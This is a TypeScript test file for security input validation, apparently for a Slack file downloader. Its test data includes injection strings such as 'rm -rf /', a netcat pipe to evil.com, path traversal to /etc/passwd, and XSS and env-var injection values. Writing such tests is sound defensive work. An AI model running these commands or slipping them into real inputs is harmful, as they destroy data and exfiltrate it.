/**
 * Security tests for input validation
 */

import { describe, test, expect } from "bun:test";

describe("Security - Input Validation", () => {
  describe("URL Validation", () => {
    test("should block non-HTTPS URLs", () => {
      const validateSlackUrl = (url: string): boolean => {
        return url.startsWith("https://files.slack.com/");
      };

      const maliciousUrls = [
        "http://files.slack.com/malicious",
        "https://evil.com/files.slack.com/fake",
        "javascript:alert('xss')",
        "file:///etc/passwd",
        "ftp://files.slack.com/file",
      ];

      maliciousUrls.forEach(url => {
        expect(validateSlackUrl(url)).toBe(false);
      });
    });

    test("should block URL injection attempts", () => {
      const validateSlackUrl = (url: string): boolean => {
        return url.startsWith("https://files.slack.com/") && 
               !url.includes(";") && 
               !url.includes("&&") && 
               !url.includes("|");
      };

      const injectionAttempts = [
        "https://files.slack.com/file.png; rm -rf /",
        "https://files.slack.com/file.png && echo 'hacked'",
        "https://files.slack.com/file.png | nc evil.com 80",
        "https://files.slack.com/file.png`rm -rf /`",
      ];

      injectionAttempts.forEach(url => {
        expect(validateSlackUrl(url)).toBe(false);
      });
    });
  });

  describe("Filename Validation", () => {
    test("should sanitize dangerous filenames", () => {
      const sanitizeFilename = (filename: string): string => {
        return filename
          .replace(/[^a-zA-Z0-9._-]/g, "_")
          .replace(/^\.+/, "_") // Remove leading dots
          .slice(0, 255); // Limit length
      };

      const dangerousFilenames = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\file",
        ".hidden",
        "con.txt", // Windows reserved name
        "file\x00.txt", // Null byte injection
        "very".repeat(100) + ".txt", // Very long filename
        "file; rm -rf /",
      ];

      dangerousFilenames.forEach(filename => {
        const sanitized = sanitizeFilename(filename);
        expect(sanitized).not.toContain("..");
        expect(sanitized).not.toContain("/");
        expect(sanitized).not.toContain("\\");
        expect(sanitized).not.toContain("\x00");
        expect(sanitized.length).toBeLessThanOrEqual(255);
        expect(sanitized).not.toStartWith(".");
      });
    });
  });

  describe("Directory Path Validation", () => {
    test("should prevent directory traversal", () => {
      const validatePath = (path: string): boolean => {
        const normalized = path.replace(/\\/g, "/");
        return !normalized.includes("../") && !normalized.includes("/..") && !normalized.startsWith("../");
      };

      const traversalAttempts = [
        "../../../etc",
        "/var/../../../etc/passwd",
        "./../../secret",
        "normal/../../../etc",
        "..\\..\\windows\\system32",
      ];

      traversalAttempts.forEach(path => {
        expect(validatePath(path)).toBe(false);
      });

      // Valid paths should pass
      const validPaths = [
        "/absolute/safe/path",
        "./safe/relative/path",
        "safe/path",
        "/downloads",
      ];

      validPaths.forEach(path => {
        expect(validatePath(path)).toBe(true);
      });
    });
  });

  describe("Token Validation", () => {
    test("should validate token format", () => {
      const validateTokenFormat = (token: string): { valid: boolean; issues: string[] } => {
        const issues: string[] = [];
        
        if (!token) {
          issues.push("Token is required");
          return { valid: false, issues };
        }
        
        if (token.length < 50) {
          issues.push("Token too short");
        }
        
        if (!token.startsWith("xoxb-") && !token.startsWith("xoxp-")) {
          issues.push("Invalid token prefix");
        }
        
        if (!/^[a-zA-Z0-9-]+$/.test(token)) {
          issues.push("Token contains invalid characters");
        }
        
        return { valid: issues.length === 0, issues };
      };

      // Invalid tokens
      const invalidTokens = [
        "",
        "short",
        "xoxb-short",
        "invalid-prefix-" + "x".repeat(50),
        "xoxb-" + "x".repeat(50) + "; echo 'injection'",
        "xoxb-token\nwith\nnewlines",
      ];

      invalidTokens.forEach(token => {
        const result = validateTokenFormat(token);
        expect(result.valid).toBe(false);
      });

      // Valid token
      const validToken = "xoxb-" + "1234567890".repeat(5);
      const result = validateTokenFormat(validToken);
      expect(result.valid).toBe(true);
      expect(result.issues).toHaveLength(0);
    });
  });

  describe("Environment Variable Injection", () => {
    test("should prevent env var injection in config", () => {
      const sanitizeEnvValue = (value: string): string => {
        // Remove potential injection characters
        return value
          .replace(/[\n\r]/g, "")
          .replace(/\$\{[^}]*\}/g, "")
          .replace(/\$\([^)]*\)/g, "");
      };

      const injectionAttempts = [
        "value\nINJECTED_VAR=malicious",
        "value\rINJECTED_VAR=malicious",
        "value${INJECTED_VAR}",
        "value$(echo injected)",
        "normal_value",
      ];

      injectionAttempts.forEach(value => {
        const sanitized = sanitizeEnvValue(value);
        expect(sanitized).not.toContain("\n");
        expect(sanitized).not.toContain("\r");
        expect(sanitized).not.toContain("${");
        expect(sanitized).not.toContain("$(");
      });
    });
  });

  describe("Command Injection Prevention", () => {
    test("should validate curl command construction", () => {
      const buildSafeCurlCommand = (url: string, outputPath: string, token: string): string[] => {
        // Use array form to prevent injection
        return [
          "curl",
          "-H", `Authorization: Bearer ${token}`,
          "-L",
          "-f",
          "--max-time", "30",
          "--max-filesize", "50000000",
          url,
          "-o", outputPath
        ];
      };

      const safeArgs = buildSafeCurlCommand(
        "https://files.slack.com/test.png",
        "/safe/path/file.png",
        "xoxb-token"
      );

      // Verify no shell metacharacters in critical positions
      expect(safeArgs[safeArgs.indexOf("-o") + 1]).not.toContain(";");
      expect(safeArgs[safeArgs.indexOf("-o") + 1]).not.toContain("&&");
      expect(safeArgs[safeArgs.indexOf("-o") + 1]).not.toContain("|");
    });
  });
});